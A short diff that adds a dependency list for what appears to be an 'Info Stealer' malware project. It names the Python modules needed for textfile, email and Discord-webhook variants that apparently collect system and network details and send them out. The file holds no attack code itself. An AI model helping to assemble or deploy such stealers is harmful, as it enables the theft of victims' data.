@@ -1,0 +1,8 @@
+For the Textfile Info Stealer:
+the needed Modules should be already preinstalled
+
+For the Email Info Stealer:
+ifaddr psutil netifaces
+
+For the Discord Webhook Info Stealer:
+psutil ifaddr requests netifaces
